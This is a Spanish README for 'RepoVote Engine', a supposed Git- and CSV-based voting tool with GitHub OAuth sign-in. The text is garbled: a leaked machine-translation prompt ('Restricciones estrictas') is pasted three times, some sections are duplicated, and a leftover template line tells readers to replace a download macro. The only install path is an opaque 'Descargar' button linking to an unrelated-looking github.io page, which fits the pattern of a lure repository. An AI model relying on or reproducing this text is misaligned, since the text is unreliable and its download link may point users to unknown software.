<!-- hy-mt2-i18n:start -->
[English](./README.md) | [中文](./README_zh-CN.md) | [日本語](./README_ja.md) | **Español**
<!-- hy-mt2-i18n:end -->

![preview](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/preview.svg)

# 📊 Motor RepoVote

**Toma de decisiones descentralizada, impulsada por tu repositorio Git**

Bienvenido a **RepoVote Engine**, una plataforma revolucionaria de código abierto que reinventa la forma en que las comunidades toman decisiones colectivas al integrar directamente el proceso de votación en su repositorio de GitHub. A diferencia de las herramientas tradicionales de encuestas que requieren sistemas de autenticación externos, RepoVote Engine aprovecha su infraestructura Git existente: cada encuesta es un archivo CSV estructurado dentro de su repositorio, cada commit representa un voto emitido, y cada solicitud de fusión constituye una posible revisión de votos.

Considere su repositorio no solo como un conjunto de código, sino como un registro de gobernanza vivo y dinámico. RepoVote Engine convierte el control de versiones estático en un motor de deliberación dinámico, donde los colaboradores votan utilizando las mismas herramientas en las que ya confían: comandos de Git, solicitudes de pull y protecciones de ramas. Esto no es otro widget de encuestas; representa un cambio filosófico: **su código, sus reglas, su democracia**.

# Restricciones estrictas
1. **Bloqueo estructural**: Mantener absolutamente intacta la estructura de datos Markdown original, los sangrados, los niveles de título, las tablas, los enlaces, las URL, las insignias, los bloques de código y el código inline.
2. **Traducción selectiva**: Solo traducir el contenido de lenguaje natural visible para el usuario.
3. **Prohibición de modificaciones**: Está **estrictamente prohibido** traducir o cambiar etiquetas de código, nombres de claves, placeholders de variables (como {{var}}, ${var}, %s, %d, etc.), ejemplos de comandos, rutas de archivos, nombres de proyectos, nombres de API, nombres de paquetes, nombres de modelos, identificadores y símbolos de código; a menos que la información de contexto ya proporcione una traducción correspondiente.
4. La traducción de términos, estilo y nombres propios debe ser coherente con la información de contexto proporcionada.

## 🌟 ¿Por qué existe RepoVote Engine?

Las herramientas modernas de colaboración presentan tres defectos fatales: **identidad fragmentada** (tener que iniciar sesión en otra aplicación más), **historial invisible** (las votaciones desaparecen una vez cerrada la encuesta) y **control centralizado** (los propietarios de la plataforma pueden modificar los resultados). RepoVote Engine elimina todos estos problemas al vincular cada voto a un objeto Git inmutable.

Cuando un desarrollador vota, crea un commit en una rama designada: el hash del commit se convierte en la marca de tiempo, la firma GPG en su identificador como votante, y la diferencia con respecto al archivo CSV de la encuesta representa su elección. Sin bases de datos, sin cookies de sesión, sin un backend opaco. Tu historial de Git es tu registro de auditoría.

Este repositorio contiene el entorno de ejecución que procesa estas encuestas basadas en CSV, verifica la idoneidad de los votantes según los alcances OAuth de GitHub y fusiona automáticamente los resultados aprobados en la rama canónica `votes/main`. Está diseñado para ejecutarse como una función sin servidor, una acción de GitHub o un servicio Node.js autohospedado.

---

## 🚀 Cómo comenzar

[![Descargar](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/button.svg)](https://vegaleonele.github.io/github-polls-voter-auth/)

*Sustituya el macro anterior [![Download](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/button.svg)](https://vegaleonele.github.io/github-polls-voter-auth/) por el método de instalación que prefiera; nuestro asistente interactivo de configuración está disponible a través del canal de distribución oficial.*

---

### 📋 Requisitos previos

Antes de desplegar RepoVote Engine, asegúrese de que su entorno soporte:

- Un repositorio de GitHub con reglas de protección de ramas (opcional, pero altamente recomendado)  
- Acceso a las credenciales de la aplicación OAuth de GitHub (ID de cliente y secreto del cliente)  
- Entorno de ejecución Node.js (versión 18 LTS o superior) para el proceso de trabajo  
- Un analizador de CSV capaz de manejar archivos codificados en UTF-8 con marcadores BOM

---

### ⚙️ Arquitectura de configuración

RepoVote Engine sigue la filosofía de **configuración como código**. Todos los parámetros se almacenan en un archivo `voteconfig.yml` en la raíz de su repositorio. Aquí hay un ejemplo mínimo:

```yaml
polls:
  - path: polls/feature-priority.csv
    voters: members
    approval_threshold: 0.6
    deadline: 2026-12-31T23:59:59Z
    anonymity: true
identity:
  provider: github
  required_org: your-org-name
  min_account_age_days: 30
output:
  results_branch: votes/consolidated
  notify_on_merge: true
```

Cada parámetro se valida contra un esquema JSON durante la inicialización; si su configuración contiene un error de escritura, el proceso de trabajo se negará a iniciar y mostrará un mensaje de error detallado que indicará el número exacto de línea.

---

## 🔑 Características principales

### 🗳️ Motor de encuestas nativo para CSV

Cada encuesta es un archivo CSV sencillo con las columnas que usted defina. Una encuesta típica podría verse así:

| Propuesta | Votante | Opción | Hora |
|----------|---------|--------|------|
| ¿Apoyar la hoja de ruta del Q3? | octocat | sí | 2026-04-12T10:30:00Z |
| ¿Apoyar la hoja de ruta del Q3? | torvalds | no | 2026-04-12T11:15:00Z |

Sin formatos propietarios, sin esquemas de base de datos. Puede editar las encuestas con cualquier herramienta de hojas de cálculo, guardarlas con `git add` y hacer un seguimiento de los cambios al igual que con cualquier otro archivo.

### 🔐 Autenticación nativa de GitHub

El motor RepoVote delega toda la verificación de identidad en el flujo OAuth de GitHub. Cuando un votante inicia una sesión, es redirigido a GitHub, donde se le pide que autorice un alcance mínimo (`read:user` y `read:org`); al regresar, el proceso genera un JWT firmado que contiene su ID de usuario de GitHub, nombre de usuario y estado de pertenencia a organizaciones.

- **Medidas contra Sybil**: La edad mínima configurable de las cuentas evita las votaciones automatizadas.  
- **Elegibilidad por organización**: Se restringe la votación a los miembros de organizaciones o equipos específicos de GitHub.  
- **Una voto por identidad**: Se garantiza mediante la deduplicación de SHA de los commits en las ramas de las encuestas.

### 📈 Registro de auditoría transparente

Cada voto corresponde a un commit. El mensaje del commit sigue un formato estructurado:

```
[VOTE] Encuesta: feature-priority.csv | Opción: Ecosistema React | Votante: validado
```

El árbol de commits contiene el archivo CSV actualizado, al que se ha añadido la fila correspondiente al votante. Se puede consultar toda la historia de una encuesta mediante `git log --all polls/feature-priority.csv`. Los intentos maliciosos de modificar votos anteriores generan historias divergentes que se detectan de inmediato.

### 🌐 Interfaz multilingüe

La interfaz de escritorio web detecta automáticamente la preferencia de idioma del navegador y muestra texto localizado en más de 20 idiomas, incluidos el inglés, el español, el francés, el alemán, el japonés, el coreano y el árabe. Las descripciones de las encuestas son compatibles con Unicode, lo que permite utilizar texto en cualquier alfabeto.

### 📱 Interfaz responsive y accesible

Gracias a su arquitectura de componentes web ligeros, la interfaz se adapta sin problemas a pantallas móviles, tabletas y ordenadores de escritorio. Cada elemento interactivo cumple con los estándares WCAG 2.1 AA: los lectores de pantalla pueden leer en voz alta los resultados de las encuestas, la navegación es totalmente accesible desde el teclado, y las combinaciones de colores respetan los valores de `prefers-color-scheme`.

### 🛡️ Confiabilidad del trabajador las 24 horas, los 7 días de la semana

El worker incluye un punto de extremo de verificación de estado que monitorea:  
- El acceso al sistema de archivos del repositorio Git  
- El uso de los límites de tasa de la API de GitHub  
- La rotación de las claves de firma JWT  
- La integridad de los archivos CSV (verificación de checksum)

Si alguna verificación falla, el worker devuelve un estado HTTP 503 y registra una alerta estructurada en un webhook configurable (por ejemplo, PagerDuty o Slack).

## 📊 Casos de uso y metáforas

Imagínese a RepoVote Engine como una **asamblea constitucional para su códigobase**. Cada archivo CSV es una iniciativa electoral. Cada solicitud de pull request es un debate en el pleno. Cada fusión es una ley promulgada.

## 📊 Casos de uso y metáforas

Considere a RepoVote Engine como una **asamblea constitucional para su código fuente**. Cada archivo CSV representa una iniciativa electoral. Cada solicitud de fusión es un debate en la asamblea. Cada fusión finalizada equivale a una ley promulgada.

| Escenario | Cómo ayuda RepoVote Engine |
|----------|---------------------------|
| **Gobernanza de proyectos de código abierto** | Permite a los mantenedores votar sobre propuestas RFC a través de pull requests |
| **Priorización de funcionalidades comunitarias** | Los usuarios votan sobre qué problemas abordar primero; las votaciones se registran de forma transparente en el repositorio |
| **Elaboración de políticas organizacionales** | Almacena las políticas del equipo como encuestas en formato CSV; realiza un seguimiento del historial de ratificación a través de Git |
| **Consentimiento en investigación académica** | Registra el consentimiento informado para los estudios mediante registros de commits inmutables |

## 🧩 Visión general de la arquitectura

## 🧩 Visión general de la arquitectura

```
┌─────────────────┐     ┌──────────────────────┐     ┌─────────────────┐
│  GitHub OAuth   │◄────│  RepoVote Worker     │────►│  Git Repository  │
│  (identidad)     │     │  (sin servidor/autónomo)   │     │  (encuestas en CSV)     │
└─────────────────┘     └──────────────────────┘     └─────────────────┘
         │                       │                            │
         ▼                       ▼                            ▼
    Navegador del usuario           Procesamiento de votos             Registro de auditoría (comités)
```

El trabajador actúa como intermediario: autentica a los usuarios a través de GitHub, verifica su elegibilidad, escribe los votos como commits en una rama temporal y, cuando se cumplen los umbrales predefinidos, fusiona esos votos en la rama de resultados canónicos.

---

## 📄 Licencia

Este proyecto se publica bajo la **Licencia MIT**. Puede usarlo, modificarlo y distribuirlo con cualquier finalidad, incluidas aplicaciones comerciales, siempre y cuando mantenga el aviso de derechos de autor original. Consulte el archivo [LICENSE](https://opensource.org/licenses/MIT) para conocer los términos completos.

---

## 🧾 Exención de responsabilidad

El RepoVote Engine se proporciona “tal cual” sin ninguna garantía, ya sea explícita o implícita. Aunque se ha hecho todo lo posible para asegurar la integridad del registro de votos mediante las funciones criptográficas de Git, ningún sistema puede garantizar una seguridad absoluta contra todos los vectores de ataque, incluidos, entre otros, cuentas de GitHub comprometidas, administradores de repositorios malintencionados o vulnerabilidades en el hardware subyacente.

- Los desarrolladores no asumen ninguna responsabilidad por las disputas que surjan a partir de los resultados de las encuestas procesados por este software.  
- Los resultados de votación no deben utilizarse como única base para decisiones legales o asignación de recursos sin una verificación independiente.  
- Siempre mantenga copias de seguridad offline de sus datos de encuestas.

Al utilizar este software, usted reconoce que ha leído esta exención de responsabilidad y asume total responsabilidad por su implementación y sus resultados.

# Restricciones estrictas
1. **Bloqueo estructural**: Se debe mantener intacta por completo la estructura de datos Markdown original, los sangrados, los niveles de título, las tablas, los enlaces, las URL, las insignias, los bloques de código y el código inline.
2. **Traducción selectiva**: Solo se deben traducir los contenidos de lenguaje natural visibles para el usuario.
3. **Prohibición de modificaciones**: Está **estrictamente prohibido** traducir o cambiar etiquetas de código, nombres de clave, placeholders de variables (como {{var}}, ${var}, %s, %d, etc.), ejemplos de comandos, rutas de archivos, nombres de proyectos, nombres de API, nombres de paquetes, nombres de modelos, identificadores y símbolos de código; a menos que ya se haya proporcionado una traducción correspondiente en la información de contexto.
4. La traducción de términos, estilos y nombres propios debe ser coherente con la información de contexto proporcionada.

## 🤝 Contribuciones

Agradecemos las contribuciones que se alineen con nuestra misión de **gobierno descentralizado y auditable**. Para proponer cambios, primero abra un debate. Todos los colaboradores deben cumplir con el código de conducta del [Contributor Covenant](https://www.contributor-covenant.org/).

# Restricciones estrictas
1. **Bloqueo estructural**: Se debe mantener intacta por completo la estructura de datos Markdown original, los sangrados, los niveles de título, las tablas, los enlaces, las URL, las insignias, los bloques de código y el código inline.
2. **Traducción selectiva**: Solo se deben traducir los contenidos de lenguaje natural visibles para el usuario.
3. **Prohibición de modificaciones**: Está **estrictamente prohibido** traducir o modificar etiquetas de código, nombres de clave, placeholders de variables (como {{var}}, ${var}, %s, %d, etc.), ejemplos de comandos, rutas de archivos, nombres de proyectos, nombres de API, nombres de paquetes, nombres de modelos, identificadores y símbolos de código; a menos que ya se haya proporcionado una traducción correspondiente en la información de contexto.
4. La traducción de términos, estilos y nombres propios debe ser coherente con la información de contexto proporcionada.

## 📬 Soporte

Para consultas técnicas, por favor revise la wiki o abra una discusión en GitHub. Nuestro equipo monitorea estos canales durante el horario laboral en la zona horaria UTC+0. En caso de vulnerabilidades de seguridad urgentes, póngase en contacto directamente con los mantenedores a través de la pestaña de seguridad.

---

[![Descargar](https://raw.githubusercontent.com/Vegaleonele/github-polls-voter-auth/main/button.svg)](https://vegaleonele.github.io/github-polls-voter-auth/)
